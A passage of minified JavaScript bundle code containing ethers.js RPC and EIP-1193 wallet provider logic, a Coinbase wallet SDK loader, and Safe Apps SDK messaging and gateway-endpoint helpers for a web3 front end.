funds","INSUFFICIENT_FUNDS",{transaction:e.params[0],info:{payload:e,error:i}});if(a.match(/nonce/i)&&a.match(/too low/i))return Mr("nonce has already been used","NONCE_EXPIRED",{transaction:e.params[0],info:{payload:e,error:i}})}if(r==="eth_call"||r==="eth_estimateGas"){const a=SD(i),c=W1.getBuiltinCallException(r==="eth_call"?"call":"estimateGas",e.params[0],a?a.data:null);return c.info={error:i,payload:e},c}const s=JSON.stringify(eFe(i));if(typeof i.message=="string"&&i.message.match(/user denied|ethers-user-denied/i))return Mr("user rejected action","ACTION_REJECTED",{action:{eth_sign:"signMessage",personal_sign:"signMessage",eth_signTypedData_v4:"signTypedData",eth_signTransaction:"signTransaction",eth_sendTransaction:"sendTransaction",eth_requestAccounts:"requestAccess",wallet_requestAccounts:"requestAccess"}[r]||"unknown",reason:"rejected",info:{payload:e,error:i}});if(r==="eth_sendRawTransaction"||r==="eth_sendTransaction"){const a=e.params[0];if(s.match(/insufficient funds|base fee exceeds gas limit/i))return Mr("insufficient funds for intrinsic transaction cost","INSUFFICIENT_FUNDS",{transaction:a,info:{error:i}});if(s.match(/nonce/i)&&s.match(/too low/i))return Mr("nonce has already been used","NONCE_EXPIRED",{transaction:a,info:{error:i}});if(s.match(/replacement transaction/i)&&s.match(/underpriced/i))return Mr("replacement fee too low","REPLACEMENT_UNDERPRICED",{transaction:a,info:{error:i}});if(s.match(/only replay-protected/i))return Mr("legacy pre-eip-155 transactions not supported","UNSUPPORTED_OPERATION",{operation:r,info:{transaction:a,info:{error:i}}})}let o=!!s.match(/the method .* does not exist/i);return o||i&&i.details&&i.details.startsWith("Unauthorized method:")&&(o=!0),o?Mr("unsupported operation","UNSUPPORTED_OPERATION",{operation:e.method,info:{error:i,payload:e}}):Mr("could not coalesce error","UNKNOWN_ERROR",{error:i,payload:e})}send(e,n){if(this.destroyed)return Promise.reject(Mr("provider destroyed; cancelled request","UNSUPPORTED_OPERATION",{operation:e}));const r=this.#t++,i=new Promise((s,o)=>{this.#n.push({resolve:s,reject:o,payload:{method:e,params:n,id:r,jsonrpc:"2.0"}})});return this.#a(),i}async getSigner(e){e==null&&(e=0);const n=this.send("eth_accounts",[]);if(typeof e=="number"){const i=await n;if(e>=i.length)throw new Error("no such account");return new d1(this,i[e])}const{accounts:r}=await ho({network:this.getNetwork(),accounts:n});e=Vn(e);for(const i of r)if(Vn(i)===e)return new d1(this,e);throw new Error("invalid account")}async listAccounts(){return(await this.send("eth_accounts",[])).map(n=>new d1(this,n))}destroy(){this.#r&&(clearTimeout(this.#r),this.#r=null);for(const{payload:e,reject:n}of this.#n)n(Mr("provider destroyed; cancelled request","UNSUPPORTED_OPERATION",{operation:e.method}));this.#n=[],super.destroy()}}class Que extends XLe{#e;constructor(e,n){super(e,n);let r=this._getOption("pollingInterval");r==null&&(r=Yue.pollingInterval),this.#e=r}_getSubscriber(e){const n=super._getSubscriber(e);return rK(n)&&(n.pollingInterval=this.#e),n}get pollingInterval(){return this.#e}set pollingInterval(e){if(!Number.isInteger(e)||e<0)throw new Error("invalid interval");this.#e=e,this._forEachSubscriber(n=>{rK(n)&&(n.pollingInterval=this.#e)})}}class Jue extends Que{#e;constructor(e,n,r){e==null&&(e="http://localhost:8545"),super(n,r),typeof e=="string"?this.#e=new nd(e):this.#e=e.clone()}_getConnection(){return this.#e.clone()}async send(e,n){return await this._start(),await super.send(e,n)}async _send(e){const n=this._getConnection();n.body=JSON.stringify(e),n.setHeader("content-type","application/json");const r=await n.send();r.assertOk();let i=r.bodyJson;return Array.isArray(i)||(i=[i]),i}}function SD(t){if(t==null)return null;if(typeof t.message=="string"&&t.message.match(/revert/i)&&gr(t.data))return{message:t.message,data:t.data};if(typeof t=="object"){for(const e in t){const n=SD(t[e]);if(n)return n}return null}if(typeof t=="string")try{return SD(JSON.parse(t))}catch{}return null}function TD(t,e){if(t!=null){if(typeof t.message=="string"&&e.push(t.message),typeof t=="object")for(const n in t)TD(t[n],e);if(typeof t=="string")try{return TD(JSON.parse(t),e)}catch{}}}function eFe(t){const e=[];return TD(t,e),e}class Bl extends Que{#e;#t;constructor(e,n,r){const i=Object.assign({},r??{},{batchMaxCount:1});pe(e&&e.request,"invalid EIP-1193 provider","ethereum",e),super(n,i),this.#t=null,r&&r.providerInfo&&(this.#t=r.providerInfo),this.#e=async(s,o)=>{const a={method:s,params:o};this.emit("debug",{action:"sendEip1193Request",payload:a});try{const c=await e.request(a);return this.emit("debug",{action:"receiveEip1193Result",result:c}),c}catch(c){const l=new Error(c.message);throw l.code=c.code,l.data=c.data,l.payload=a,this.emit("debug",{action:"receiveEip1193Error",error:l}),l}}}get providerInfo(){return this.#t}async send(e,n){return await this._start(),await super.send(e,n)}async _send(e){pe(!Array.isArray(e),"EIP-1193 does not support batch request","payload",e);try{const n=await this.#e(e.method,e.params||[]);return[{id:e.id,result:n}]}catch(n){return[{id:e.id,error:{code:n.code,data:n.data,message:n.message}}]}}getRpcError(e,n){switch(n=JSON.parse(JSON.stringify(n)),n.error.code||-1){case 4001:n.error.message=`ethers-user-denied: ${n.error.message}`;break;case 4200:n.error.message=`ethers-unsupported: ${n.error.message}`;break}return super.getRpcError(e,n)}async hasSigner(e){e==null&&(e=0);const n=await this.send("eth_accounts",[]);return typeof e=="number"?n.length>e:(e=e.toLowerCase(),n.filter(r=>r.toLowerCase()===e).length!==0)}async getSigner(e){if(e==null&&(e=0),!await this.hasSigner(e))try{await this.#e("eth_requestAccounts",[])}catch(n){const r=n.payload;throw this.getRpcError(r,{id:r.id,error:n})}return await super.getSigner(e)}static async discover(e){if(e==null&&(e={}),e.provider)return new Bl(e.provider);const n=e.window?e.window:typeof window<"u"?window:null;if(n==null)return null;const r=e.anyProvider;if(r&&n.ethereum)return new Bl(n.ethereum);if(!("addEventListener"in n&&"dispatchEvent"in n&&"removeEventListener"in n))return null;const i=e.timeout?e.timeout:300;return i===0?null:await new Promise((s,o)=>{let a=[];const c=h=>{a.push(h.detail),r&&l()},l=()=>{if(clearTimeout(f),a.length)if(e&&e.filter){const h=e.filter(a.map(m=>Object.assign({},m.info)));if(h==null)s(null);else if(h instanceof Bl)s(h);else{let m=null;if(h.uuid&&(m=a.filter(w=>h.uuid===w.info.uuid)[0]),m){const{provider:b,info:w}=m;s(new Bl(b,void 0,{providerInfo:w}))}else o(Mr("filter returned unknown info","UNSUPPORTED_OPERATION",{value:h}))}}else{const{provider:h,info:m}=a[0];s(new Bl(h,void 0,{providerInfo:m}))}else s(null);n.removeEventListener("eip6963:announceProvider",c)},f=setTimeout(()=>{l()},i);n.addEventListener("eip6963:announceProvider",c),n.dispatchEvent(new Event("eip6963:requestProvider"))})}}const f1={hexStringToNumber(t){const e=t.startsWith("0x")?t.slice(2):t;return parseInt(e,16)},numberToHexString(t){return`0x${t.toString(16)}`},async getUserInfo(t){const[e,n]=await Promise.all([f1.getAddresses(t),f1.getChainId(t)]);return{chainId:n,addresses:e}},async getChainId(t){const e=await t.request({method:"eth_chainId"});return Number(e)},async getAddress(t){const[e]=await t.request({method:"eth_accounts"});return e},async getAddresses(t){return await t.request({method:"eth_accounts"})},async addEthereumChain(t,e){const n=e.rpcUrls.chainDefault?.http||[];await t.request({method:"wallet_addEthereumChain",params:[{chainId:f1.numberToHexString(e.id),rpcUrls:[...n],chainName:e.name,nativeCurrency:{name:e.nativeCurrency.name,decimals:e.nativeCurrency.decimals,symbol:e.nativeCurrency.symbol},blockExplorerUrls:[e.blockExplorers?.default.url],iconUrls:[Ga.NetworkImageIds[e.id]]}]})}};class kj{constructor(){this.initialized=!1}async getProvider(){return Promise.resolve(this.provider)}}class tFe extends kj{async initialize(){const e=Y.getCaipNetworks(),{metadata:n,coinbasePreference:r}=de.state;try{const{createBaseAccountSDK:i}=await pt(async()=>{const{createBaseAccountSDK:o}=await import("./index-CZ88CzCk.js");return{createBaseAccountSDK:o}},__vite__mapDeps([68,1,2]));if(typeof window>"u")return Promise.resolve();const s=i({appName:n?.name,appLogoUrl:n?.icons[0],appChainIds:e?.map(o=>o.id)||[1,84532],preference:{options:r??"all"}});return this.provider=s.getProvider(),this.initialized=!0,Promise.resolve()}catch(i){return console.error("Failed to import Coinbase Wallet SDK:",i),Promise.resolve()}}async getProvider(){return Promise.resolve(this.provider)}}var MO={},Fv={},$d={},hb={},nm={},$v={},Hv={},iK;function Xue(){if(iK)return Hv;iK=1,Object.defineProperty(Hv,"__esModule",{value:!0}),Hv.getSDKVersion=void 0;const t=()=>"9.1.0";return Hv.getSDKVersion=t,Hv}var zv={},sK;function nFe(){if(sK)return zv;sK=1,Object.defineProperty(zv,"__esModule",{value:!0}),zv.generateRequestId=void 0;const t=r=>r.toString(16).padStart(2,"0"),e=r=>{const i=new Uint8Array(r/2);return window.crypto.getRandomValues(i),Array.from(i,t).join("")},n=()=>typeof window<"u"?e(10):new Date().getTime().toString(36);return zv.generateRequestId=n,zv}var oK;function ele(){if(oK)return $v;oK=1,Object.defineProperty($v,"__esModule",{value:!0}),$v.MessageFormatter=void 0;const t=Xue(),e=nFe();class n{}return $v.MessageFormatter=n,n.makeRequest=(r,i)=>({id:(0,e.generateRequestId)(),method:r,params:i,env:{sdkVersion:(0,t.getSDKVersion)()}}),n.makeResponse=(r,i,s)=>({id:r,success:!0,version:s,data:i}),n.makeErrorResponse=(r,i,s)=>({id:r,success:!1,error:i,version:s}),$v}var rm={},aK;function ry(){if(aK)return rm;aK=1,Object.defineProperty(rm,"__esModule",{value:!0}),rm.RestrictedMethods=rm.Methods=void 0;var t;(function(n){n.sendTransactions="sendTransactions",n.rpcCall="rpcCall",n.getChainInfo="getChainInfo",n.getSafeInfo="getSafeInfo",n.getTxBySafeTxHash="getTxBySafeTxHash",n.getSafeBalances="getSafeBalances",n.signMessage="signMessage",n.signTypedMessage="signTypedMessage",n.getEnvironmentInfo="getEnvironmentInfo",n.getOffChainSignature="getOffChainSignature",n.requestAddressBook="requestAddressBook",n.wallet_getPermissions="wallet_getPermissions",n.wallet_requestPermissions="wallet_requestPermissions"})(t||(rm.Methods=t={}));var e;return(function(n){n.requestAddressBook="requestAddressBook"})(e||(rm.RestrictedMethods=e={})),rm}var cK;function rFe(){return cK||(cK=1,(function(t){var e=nm&&nm.__createBinding||(Object.create?(function(s,o,a,c){c===void 0&&(c=a);var l=Object.getOwnPropertyDescriptor(o,a);(!l||("get"in l?!o.__esModule:l.writable||l.configurable))&&(l={enumerable:!0,get:function(){return o[a]}}),Object.defineProperty(s,c,l)}):(function(s,o,a,c){c===void 0&&(c=a),s[c]=o[a]})),n=nm&&nm.__exportStar||function(s,o){for(var a in s)a!=="default"&&!Object.prototype.hasOwnProperty.call(o,a)&&e(o,s,a)};Object.defineProperty(t,"__esModule",{value:!0});const r=ele();class i{constructor(o=null,a=!1){this.allowedOrigins=null,this.callbacks=new Map,this.debugMode=!1,this.isServer=typeof window>"u",this.isValidMessage=({origin:c,data:l,source:f})=>{const h=!l,m=!this.isServer&&f===window.parent,b=typeof l.version<"u"&&parseInt(l.version.split(".")[0]),w=typeof b=="number"&&b>=1;let y=!0;return Array.isArray(this.allowedOrigins)&&(y=this.allowedOrigins.find(E=>E.test(c))!==void 0),!h&&m&&w&&y},this.logIncomingMessage=c=>{console.info(`Safe Apps SDK v1: A message was received from origin ${c.origin}. `,c.data)},this.onParentMessage=c=>{this.isValidMessage(c)&&(this.debugMode&&this.logIncomingMessage(c),this.handleIncomingMessage(c.data))},this.handleIncomingMessage=c=>{const{id:l}=c,f=this.callbacks.get(l);f&&(f(c),this.callbacks.delete(l))},this.send=(c,l)=>{const f=r.MessageFormatter.makeRequest(c,l);if(this.isServer)throw new Error("Window doesn't exist");return window.parent.postMessage(f,"*"),new Promise((h,m)=>{this.callbacks.set(f.id,b=>{if(!b.success){m(new Error(b.error));return}h(b)})})},this.allowedOrigins=o,this.debugMode=a,this.isServer||window.addEventListener("message",this.onParentMessage)}}t.default=i,n(ry(),t)})(nm)),nm}var qv={},im={},Vv={},uK;function iFe(){if(uK)return Vv;uK=1,Object.defineProperty(Vv,"__esModule",{value:!0}),Vv.isObjectEIP712TypedData=void 0;const t=e=>typeof e=="object"&&e!=null&&"domain"in e&&"types"in e&&"message"in e;return Vv.isObjectEIP712TypedData=t,Vv}var UO={},lK;function sFe(){return lK||(lK=1,Object.defineProperty(UO,"__esModule",{value:!0})),UO}var LO={},sm={},om={},Hd={},dK;function oFe(){if(dK)return Hd;dK=1;var t=Hd&&Hd.__awaiter||function(c,l,f,h){function m(b){return b instanceof f?b:new f(function(w){w(b)})}return new(f||(f=Promise))(function(b,w){function y(R){try{A(h.next(R))}catch(S){w(S)}}function E(R){try{A(h.throw(R))}catch(S){w(S)}}function A(R){R.done?b(R.value):m(R.value).then(y,E)}A((h=h.apply(c,l||[])).next())})};Object.defineProperty(Hd,"__esModule",{value:!0}),Hd.insertParams=r,Hd.stringifyQuery=i,Hd.fetchData=o,Hd.getData=a;const e=c=>typeof c=="object"&&c!==null&&("code"in c||"statusCode"in c)&&"message"in c;function n(c,l,f){return c.replace(new RegExp(`\\{${l}\\}`,"g"),f)}function r(c,l){return l?Object.keys(l).reduce((f,h)=>n(f,h,String(l[h])),c):c}function i(c){if(!c)return"";const l=new URLSearchParams;Object.keys(c).forEach(h=>{c[h]!=null&&l.append(h,String(c[h]))});const f=l.toString();return f?`?${f}`:""}function s(c){return t(this,void 0,void 0,function*(){var l;let f;try{f=yield c.json()}catch{f={}}if(!c.ok){const h=e(f)?`CGW error - ${(l=f.code)!==null&&l!==void 0?l:f.statusCode}: ${f.message}`:`CGW error - status ${c.statusText}`;throw new Error(h)}return f})}function o(c,l,f,h,m){return t(this,void 0,void 0,function*(){const b=Object.assign({"Content-Type":"application/json"},h),w={method:l??"POST",headers:b};m&&(w.credentials=m),f!=null&&(w.body=typeof f=="string"?f:JSON.stringify(f));const y=yield fetch(c,w);return s(y)})}function a(c,l,f){return t(this,void 0,void 0,function*(){const h={method:"GET"};l&&(h.headers=Object.assign(Object.assign({},l),{"Content-Type":"application/json"})),f&&(h.credentials=f);const m=yield fetch(c,h);return s(m)})}return Hd}var fK;function aFe(){if(fK)return om;fK=1,Object.defineProperty(om,"__esModule",{value:!0}),om.postEndpoint=n,om.putEndpoint=r,om.deleteEndpoint=i,om.getEndpoint=s;const t=oFe();function e(o,a,c,l){const f=(0,t.insertParams)(a,c),h=(0,t.stringifyQuery)(l);return`${o}${f}${h}`}function n(o,a,c){const l=e(o,a,c?.path,c?.query);return(0,t.fetchData)(l,"POST",c?.body,c?.headers,c?.credentials)}function r(o,a,c){const l=e(o,a,c?.path,c?.query);return(0,t.fetchData)(l,"PUT",c?.body,c?.headers,c?.credentials)}function i(o,a,c){const l=e(o,a,c?.path,c?.query);return(0,t.fetchData)(l,"DELETE",c?.body,c?.headers,c?.credentials)}function s(o,a,c,l){if(l)return(0,t.getData)(l,void 0,c?.credentials);const f=e(o,a,c?.path,c?.query);return(0,t.getData)(f,c?.headers,c?.credentials)}return om}var Wv={},hK;function cFe(){return hK||(hK=1,Object.defineProperty(Wv,"__esModule",{value:!0}),Wv.DEFAULT_BASE_URL=void 0,Wv.DEFAULT_BASE_URL="https://safe-client.safe.global"),Wv}var Gv={},pK;function uFe(){if(pK)return Gv;pK=1,Object.defineProperty(Gv,"__esModule",{value:!0}),Gv.ImplementationVersionState=void 0;var t;return(function(e){e.UP_TO_DATE="UP_TO_DATE",e.OUTDATED="OUTDATED",e.UNKNOWN="UNKNOWN"})(t||(Gv.ImplementationVersionState=t={})),Gv}var zd={},mK;function lFe(){if(mK)return zd;mK=1,Object.defineProperty(zd,"__esModule",{value:!0}),zd.SafeAppSocialPlatforms=zd.SafeAppFeatures=zd.SafeAppAccessPolicyTypes=void 0;var t;(function(r){r.NoRestrictions="NO_RESTRICTIONS",r.DomainAllowlist="DOMAIN_ALLOWLIST"})(t||(zd.SafeAppAccessPolicyTypes=t={}));var e;(function(r){r.BATCHED_TRANSACTIONS="BATCHED_TRANSACTIONS"})(e||(zd.SafeAppFeatures=e={}));var n;return(function(r){r.TWITTER="TWITTER",r.GITHUB="GITHUB",r.DISCORD="DISCORD",r.TELEGRAM="TELEGRAM"})(n||(zd.SafeAppSocialPlatforms=n={})),zd}var fr={},gK;function dFe(){if(gK)return fr;gK=1,Object.defineProperty(fr,"__esModule",{value:!0}),fr.LabelValue=fr.StartTimeValue=fr.DurationType=fr.DetailedExecutionInfoType=fr.TransactionListItemType=fr.ConflictType=fr.TransactionInfoType=fr.SettingsInfoType=fr.TransactionTokenType=fr.TransferDirection=fr.TransactionStatus=fr.Operation=void 0;var t;(function(m){m[m.CALL=0]="CALL",m[m.DELEGATE=1]="DELEGATE"})(t||(fr.Operation=t={}));var e;(function(m){m.AWAITING_CONFIRMATIONS="AWAITING_CONFIRMATIONS",m.AWAITING_EXECUTION="AWAITING_EXECUTION",m.CANCELLED="CANCELLED",m.FAILED="FAILED",m.SUCCESS="SUCCESS"})(e||(fr.TransactionStatus=e={}));var n;(function(m){m.INCOMING="INCOMING",m.OUTGOING="OUTGOING",m.UNKNOWN="UNKNOWN"})(n||(fr.TransferDirection=n={}));var r;(function(m){m.ERC20="ERC20",m.ERC721="ERC721",m.NATIVE_COIN="NATIVE_COIN"})(r||(fr.TransactionTokenType=r={}));var i;(function(m){m.SET_FALLBACK_HANDLER="SET_FALLBACK_HANDLER",m.ADD_OWNER="ADD_OWNER",m.REMOVE_OWNER="REMOVE_OWNER",m.SWAP_OWNER="SWAP_OWNER",m.CHANGE_THRESHOLD="CHANGE_THRESHOLD",m.CHANGE_IMPLEMENTATION="CHANGE_IMPLEMENTATION",m.ENABLE_MODULE="ENABLE_MODULE",m.DISABLE_MODULE="DISABLE_MODULE",m.SET_GUARD="SET_GUARD",m.DELETE_GUARD="DELETE_GUARD"})(i||(fr.SettingsInfoType=i={}));var s;(function(m){m.TRANSFER="Transfer",m.SETTINGS_CHANGE="SettingsChange",m.CUSTOM="Custom",m.CREATION="Creation",m.SWAP_ORDER="SwapOrder",m.TWAP_ORDER="TwapOrder",m.SWAP_TRANSFER="SwapTransfer",m.NATIVE_STAKING_DEPOSIT="NativeStakingDeposit",m.NATIVE_STAKING_VALIDATORS_EXIT="NativeStakingValidatorsExit",m.NATIVE_STAKING_WITHDRAW="NativeStakingWithdraw"})(s||(fr.TransactionInfoType=s={}));var o;(function(m){m.NONE="None",m.HAS_NEXT="HasNext",m.END="End"})(o||(fr.ConflictType=o={}));var a;(function(m){m.TRANSACTION="TRANSACTION",m.LABEL="LABEL",m.CONFLICT_HEADER="CONFLICT_HEADER",m.DATE_LABEL="DATE_LABEL"})(a||(fr.TransactionListItemType=a={}));var c;(function(m){m.MULTISIG="MULTISIG",m.MODULE="MODULE"})(c||(fr.DetailedExecutionInfoType=c={}));var l;(function(m){m.AUTO="AUTO",m.LIMIT_DURATION="LIMIT_DURATION"})(l||(fr.DurationType=l={}));var f;(function(m){m.AT_MINING_TIME="AT_MINING_TIME",m.AT_EPOCH="AT_EPOCH"})(f||(fr.StartTimeValue=f={}));var h;return(function(m){m.Queued="Queued",m.Next="Next"})(h||(fr.LabelValue=h={})),fr}var qd={},yK;function fFe(){if(yK)return qd;yK=1,Object.defineProperty(qd,"__esModule",{value:!0}),qd.FEATURES=qd.GAS_PRICE_TYPE=qd.RPC_AUTHENTICATION=void 0;var t;(function(r){r.API_KEY_PATH="API_KEY_PATH",r.NO_AUTHENTICATION="NO_AUTHENTICATION",r.UNKNOWN="UNKNOWN"})(t||(qd.RPC_AUTHENTICATION=t={}));var e;(function(r){r.ORACLE="ORACLE",r.FIXED="FIXED",r.FIXED_1559="FIXED1559",r.UNKNOWN="UNKNOWN"})(e||(qd.GAS_PRICE_TYPE=e={}));var n;return(function(r){r.ERC721="ERC721",r.SAFE_APPS="SAFE_APPS",r.CONTRACT_INTERACTION="CONTRACT_INTERACTION",r.DOMAIN_LOOKUP="DOMAIN_LOOKUP",r.SPENDING_LIMIT="SPENDING_LIMIT",r.EIP1559="EIP1559",r.SAFE_TX_GAS_OPTIONAL="SAFE_TX_GAS_OPTIONAL",r.TX_SIMULATION="TX_SIMULATION",r.EIP1271="EIP1271"})(n||(qd.FEATURES=n={})),qd}var Kv={},bK;function hFe(){if(bK)return Kv;bK=1,Object.defineProperty(Kv,"__esModule",{value:!0}),Kv.TokenType=void 0;var t;return(function(e){e.ERC20="ERC20",e.ERC721="ERC721",e.NATIVE_TOKEN="NATIVE_TOKEN",e.UNKNOWN="UNKNOWN"})(t||(Kv.TokenType=t={})),Kv}var FO={},wK;function pFe(){return wK||(wK=1,Object.defineProperty(FO,"__esModule",{value:!0})),FO}var am={},vK;function mFe(){if(vK)return am;vK=1,Object.defineProperty(am,"__esModule",{value:!0}),am.NativeStakingStatus=am.ConfirmationViewTypes=void 0;var t;(function(n){n.GENERIC="GENERIC",n.COW_SWAP_ORDER="COW_SWAP_ORDER",n.COW_SWAP_TWAP_ORDER="COW_SWAP_TWAP_ORDER",n.KILN_NATIVE_STAKING_DEPOSIT="KILN_NATIVE_STAKING_DEPOSIT",n.KILN_NATIVE_STAKING_VALIDATORS_EXIT="KILN_NATIVE_STAKING_VALIDATORS_EXIT",n.KILN_NATIVE_STAKING_WITHDRAW="KILN_NATIVE_STAKING_WITHDRAW"})(t||(am.ConfirmationViewTypes=t={}));var e;return(function(n){n.NOT_STAKED="NOT_STAKED",n.ACTIVATING="ACTIVATING",n.DEPOSIT_IN_PROGRESS="DEPOSIT_IN_PROGRESS",n.ACTIVE="ACTIVE",n.EXIT_REQUESTED="EXIT_REQUESTED",n.EXITING="EXITING",n.EXITED="EXITED",n.SLASHED="SLASHED"})(e||(am.NativeStakingStatus=e={})),am}var cm={},EK;function gFe(){if(EK)return cm;EK=1,Object.defineProperty(cm,"__esModule",{value:!0}),cm.SafeMessageStatus=cm.SafeMessageListItemType=void 0;var t;(function(n){n.DATE_LABEL="DATE_LABEL",n.MESSAGE="MESSAGE"})(t||(cm.SafeMessageListItemType=t={}));var e;return(function(n){n.NEEDS_CONFIRMATION="NEEDS_CONFIRMATION",n.CONFIRMED="CONFIRMED"})(e||(cm.SafeMessageStatus=e={})),cm}var Zv={},_K;function yFe(){if(_K)return Zv;_K=1,Object.defineProperty(Zv,"__esModule",{value:!0}),Zv.DeviceType=void 0;var t;return(function(e){e.ANDROID="ANDROID",e.IOS="IOS",e.WEB="WEB"})(t||(Zv.DeviceType=t={})),Zv}var $O={},AK;function bFe(){return AK||(AK=1,Object.defineProperty($O,"__esModule",{value:!0})),$O}var CK;function wFe(){return CK||(CK=1,(function(t){var e=sm&&sm.__createBinding||(Object.create?(function(Ne,Ve,Qe,dt){dt===void 0&&(dt=Qe);var cr=Object.getOwnPropertyDescriptor(Ve,Qe);(!cr||("get"in cr?!Ve.__esModule:cr.writable||cr.configurable))&&(cr={enumerable:!0,get:function(){return Ve[Qe]}}),Object.defineProperty(Ne,dt,cr)}):(function(Ne,Ve,Qe,dt){dt===void 0&&(dt=Qe),Ne[dt]=Ve[Qe]})),n=sm&&sm.__exportStar||function(Ne,Ve){for(var Qe in Ne)Qe!=="default"&&!Object.prototype.hasOwnProperty.call(Ve,Qe)&&e(Ve,Ne,Qe)};Object.defineProperty(t,"__esModule",{value:!0}),t.setBaseUrl=void 0,t.relayTransaction=a,t.getRelayCount=c,t.getSafeInfo=l,t.getIncomingTransfers=f,t.getModuleTransactions=h,t.getMultisigTransactions=m,t.getBalances=b,t.getFiatCurrencies=w,t.getOwnedSafes=y,t.getAllOwnedSafes=E,t.getCollectibles=A,t.getCollectiblesPage=R,t.getTransactionHistory=S,t.getTransactionQueue=v,t.getTransactionDetails=k,t.deleteTransaction=O,t.postSafeGasEstimation=_,t.getNonces=I,t.proposeTransaction=T,t.getConfirmationView=B,t.getTxPreview=U,t.getChainsConfig=M,t.getChainConfig=N,t.getSafeApps=q,t.getMasterCopies=P,t.getDecodedData=C,t.getSafeMessages=j,t.getSafeMessage=z,t.proposeSafeMessage=$,t.confirmSafeMessage=H,t.getDelegates=L,t.registerDevice=V,t.unregisterSafe=G,t.unregisterDevice=Z,t.registerEmail=J,t.changeEmail=ne,t.resendEmailVerificationCode=re,t.verifyEmail=le,t.getRegisteredEmail=oe,t.deleteRegisteredEmail=ue,t.registerRecoveryModule=be,t.unsubscribeSingle=Me,t.unsubscribeAll=Te,t.getSafeOverviews=Oe,t.getContract=Ke,t.getAuthNonce=it,t.verifyAuth=at,t.createAccount=At,t.getAccount=Et,t.deleteAccount=ze,t.getAccountDataTypes=Re,t.getAccountDataSettings=xn,t.putAccountDataSettings=Ln,t.getIndexingStatus=Nn;const r=aFe(),i=cFe();n(uFe(),t),n(lFe(),t),n(dFe(),t),n(fFe(),t),n(hFe(),t),n(pFe(),t),n(mFe(),t),n(gFe(),t),n(yFe(),t),n(bFe(),t);let s=i.DEFAULT_BASE_URL;const o=Ne=>{s=Ne};t.setBaseUrl=o;function a(Ne,Ve){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/relay",{path:{chainId:Ne},body:Ve})}function c(Ne,Ve){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/relay/{address}",{path:{chainId:Ne,address:Ve}})}function l(Ne,Ve){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{address}",{path:{chainId:Ne,address:Ve}})}function f(Ne,Ve,Qe,dt){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{address}/incoming-transfers/",{path:{chainId:Ne,address:Ve},query:Qe},dt)}function h(Ne,Ve,Qe,dt){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{address}/module-transactions/",{path:{chainId:Ne,address:Ve},query:Qe},dt)}function m(Ne,Ve,Qe,dt){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{address}/multisig-transactions/",{path:{chainId:Ne,address:Ve},query:Qe},dt)}function b(Ne,Ve,Qe="usd",dt={}){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{address}/balances/{currency}",{path:{chainId:Ne,address:Ve,currency:Qe},query:dt})}function w(){return(0,r.getEndpoint)(s,"/v1/balances/supported-fiat-codes")}function y(Ne,Ve){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/owners/{address}/safes",{path:{chainId:Ne,address:Ve}})}function E(Ne){return(0,r.getEndpoint)(s,"/v1/owners/{address}/safes",{path:{address:Ne}})}function A(Ne,Ve,Qe={}){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{address}/collectibles",{path:{chainId:Ne,address:Ve},query:Qe})}function R(Ne,Ve,Qe={},dt){return(0,r.getEndpoint)(s,"/v2/chains/{chainId}/safes/{address}/collectibles",{path:{chainId:Ne,address:Ve},query:Qe},dt)}function S(Ne,Ve,Qe={},dt){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/transactions/history",{path:{chainId:Ne,safe_address:Ve},query:Qe},dt)}function v(Ne,Ve,Qe={},dt){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/transactions/queued",{path:{chainId:Ne,safe_address:Ve},query:Qe},dt)}function k(Ne,Ve){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/transactions/{transactionId}",{path:{chainId:Ne,transactionId:Ve}})}function O(Ne,Ve,Qe){return(0,r.deleteEndpoint)(s,"/v1/chains/{chainId}/transactions/{safeTxHash}",{path:{chainId:Ne,safeTxHash:Ve},body:{signature:Qe}})}function _(Ne,Ve,Qe){return(0,r.postEndpoint)(s,"/v2/chains/{chainId}/safes/{safe_address}/multisig-transactions/estimations",{path:{chainId:Ne,safe_address:Ve},body:Qe})}function I(Ne,Ve){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/nonces",{path:{chainId:Ne,safe_address:Ve}})}function T(Ne,Ve,Qe){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/transactions/{safe_address}/propose",{path:{chainId:Ne,safe_address:Ve},body:Qe})}function B(Ne,Ve,Qe,dt,cr,ui){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/views/transaction-confirmation",{path:{chainId:Ne,safe_address:Ve},body:{operation:Qe,data:dt,to:cr,value:ui}})}function U(Ne,Ve,Qe,dt,cr,ui){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/transactions/{safe_address}/preview",{path:{chainId:Ne,safe_address:Ve},body:{operation:Qe,data:dt,to:cr,value:ui}})}function M(Ne){return(0,r.getEndpoint)(s,"/v1/chains",{query:Ne})}function N(Ne){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}",{path:{chainId:Ne}})}function q(Ne,Ve={}){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safe-apps",{path:{chainId:Ne},query:Ve})}function P(Ne){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/about/master-copies",{path:{chainId:Ne}})}function C(Ne,Ve,Qe,dt){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/data-decoder",{path:{chainId:Ne},body:{operation:Ve,data:Qe,to:dt}})}function j(Ne,Ve,Qe){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/messages",{path:{chainId:Ne,safe_address:Ve},query:{}},Qe)}function z(Ne,Ve){return(0,r.getEndpoint)(s,"/v1/chains/{chainId}/messages/{message_hash}",{path:{chainId:Ne,message_hash:Ve}})}function $(Ne,Ve,Qe){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/safes/{safe_address}/messages",{path:{chainId:Ne,safe_address:Ve},body:Qe})}function H(Ne,Ve,Qe){return(0,r.postEndpoint)(s,"/v1/chains/{chainId}/messages/{message_hash}/signatures",{path:{chainId:Ne,message_hash:Ve},body:Qe})}function 